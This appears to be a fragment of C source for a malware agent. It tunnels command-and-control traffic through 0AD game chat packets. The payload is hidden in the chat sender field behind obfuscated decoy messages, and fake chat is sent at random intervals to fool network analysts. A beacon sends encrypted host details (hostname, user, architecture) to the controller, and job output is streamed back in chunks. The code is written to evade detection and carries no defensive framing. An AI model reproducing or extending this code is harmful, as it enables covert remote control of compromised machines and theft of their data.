/* ── Low-level network send: covert channel inside game chat ────────────
 * The 0AD NMT_CHAT message format has two fields:
 *   - sender GUID / name : normally a player identifier
 *   - message text        : the visible chat line
 *
 * Our trick:
 *   cover (visible field) = a random legitimate-looking chat message
 *                           (picked from the obfuscated FAKE_MSGS pool).
 *                           An analyst watching 0AD chat sees normal text.
 *   body (GUID/sender field) = C2 payload, base62-encoded.
 *                           The 0AD UI displays the sender name, not this field
 *                           in the same way → C2 data hidden in plain sight.
 *
 * v4_build() assembles the full packet. send_v4() is the only function
 * that actually calls enet_peer_send() for C2 traffic. */
static void send_v4(uint16_t type_char, const char *body){
    if(!g_peer||!g_host) return;
    char _cover[128];
    get_obf_msg((unsigned)randombytes_uniform((uint32_t)OBF_MSGS_COUNT), _cover);
    uint8_t pkt[8400];
    size_t pklen=v4_build(pkt,type_char,0,body,_cover);
    enet_peer_send(g_peer,0,enet_packet_create(pkt,pklen,ENET_PACKET_FLAG_RELIABLE));
    enet_host_flush(g_host);}

/* ── Fake game traffic: behavioral camouflage ───────────────────────────
 * Problem: even if individual packets look clean, a network analyst watching
 * a 0AD game session would notice that our "player" only sends chat when
 * issuing C2 commands — abnormal behavior.
 *
 * Solution: send_plain_chat() emits genuine-looking chat messages at random
 * intervals (every 5-15 minutes) regardless of C2 activity. These packets:
 *   - contain NO V4 marker → v4_parse() returns 0 (ignored by the controller).
 *   - look exactly like real player chat to a network observer.
 *   - are drawn from FAKE_MSGS (obf_agent_strings.h), which contains
 *     40+ common 0AD in-game phrases XOR-encoded at build time.
 *
 * NMT_CHAT packets without a V4 marker are silently dropped by the controller;
 * the agent sends them purely for traffic pattern mimicry. */
/* FAKE_MSGS: no plaintext strings — see obf_agent_strings.h (generated).
 * Use get_obf_msg(idx, buf) to decode at runtime. */

static void send_plain_chat(const char *msg){
    if(!g_peer||!g_host) return;
    uint8_t pl[8400];size_t off=0;
    /* The sender field is a GUID (like "a1b2c3d4-...").
     * We use g_chat_guid which starts with a hex character (0-9 / a-f).
     * C2 packet GUIDs start with 'g'-'n' (V4 markers) so there is no
     * collision: the controller can distinguish "fake chat" from "C2 data"
     * purely by the first character of the sender field.
     * The 0AD server resolves the GUID to a display name — transparent to players. */
    off+=wcstr(pl+off,g_chat_guid[0]?g_chat_guid:g_player);
    for(const char *s=msg;*s;s++){pl[off]=0x00;pl[off+1]=(uint8_t)*s;off+=2;}
    pl[off]=0x00;pl[off+1]=0x00;off+=2;                  /* null-term CStrW */
    uint8_t pkt[8400];size_t pklen=mk_pkt(pkt,NMT_CHAT,pl,off);
    enet_peer_send(g_peer,0,enet_packet_create(pkt,pklen,ENET_PACKET_FLAG_RELIABLE));
    enet_host_flush(g_host);}

/* ── Keep-Alive beacon (KA) — V6 format ────────────────────────────────
 * Sent every KA_BASE_SEC seconds (Poisson-jittered) to signal liveness and
 * to carry the agent's X25519 public key so the controller can initiate DH.
 *
 * Packet body layout (base62-encoded in the NMT_CHAT sender field):
 *   tok8  (8 chars): FNV-32 of the pre-shared key g_key → anti-spoofing token.
 *                    The controller verifies this before processing.
 *   aid8  (8 chars): FNV-32 of g_agent_id → identifies this specific agent.
 *   pub64 (64 chars): our X25519 public key (32 bytes → 64 hex-like b62 chars).
 *                    The controller uses this to compute the shared DH secret.
 *   rc4_enc(sysinfo): the sysinfo string (hostname, user, arch...) encrypted
 *                    with static RC4+g_key. Only decryptable by ctrl (knows g_key). */
static void send_ka(void){
    char body[2048];int off=0;
    v4_e4(body+off,fnv32(g_key));  off+=8;
    v4_e4(body+off,g_aid_hash);    off+=8;
    v4_eb(body+off,g_agent_pub,32);off+=64; /* X25519 pubkey in plaintext */
    off+=(int)v4_enc(body+off,g_key,g_sysinfo,strlen(g_sysinfo)); /* static RC4 */
    body[off]='\0';
    send_v4(V4_KA,body);}

/* ── RSP streaming V6 ── */

/* Sends the current chunk_buf of a job.
 * is_final=1: tot=seq_sent (last chunk, ctrl knows it's done)
 * is_final=0: tot=0
 */
static void send_job_chunk(Job *j, int is_final){
    if(!j->chunk_used && !is_final) return;
    char body[20 + (CHUNK_PAYLOAD+40)*2 + 4];
    int off=0;
    v4_e4(body+off, g_aid_hash);           off+=8;
    v4_e2(body+off, (uint16_t)j->job_id);  off+=4; /* jid4 */
    j->seq_sent++;
    v4_e2(body+off, j->seq_sent);          off+=4; /* seq4 */
    v4_e2(body+off, is_final ? j->seq_sent : 0); off+=4; /* tot4 */
    off+=(int)c2_enc(body+off, j->chunk_buf, j->chunk_used);
    body[off]='\0';
    send_v4(V4_RSP, body);
    j->chunk_used=0;}

/* System message (jid=0): single slice, always final. */
static void send_sys_rsp(const char *msg){
    size_t mlen=strlen(msg);
    if(mlen>CHUNK_PAYLOAD) mlen=CHUNK_PAYLOAD; /* safe truncation */
    char body[20 + (CHUNK_PAYLOAD+40)*2 + 4];
    int off=0;
    v4_e4(body+off, g_aid_hash); off+=8;
    v4_e2(body+off, 0);          off+=4; /* jid=0 */
    v4_e2(body+off, 1);          off+=4; /* seq=1 */
    v4_e2(body+off, 1);          off+=4; /* tot=1 */
    /* sys RSP always uses session key if available */
    if(g_dh_done) off+=(int)v6_enc(body+off, g_session_key, msg, mlen);
    else          off+=(int)v4_enc(body+off, g_key, msg, mlen);
    body[off]='\0';
    send_v4(V4_RSP, body);}

/* Compatibility: send_text uses send_sys_rsp (jid=0). */
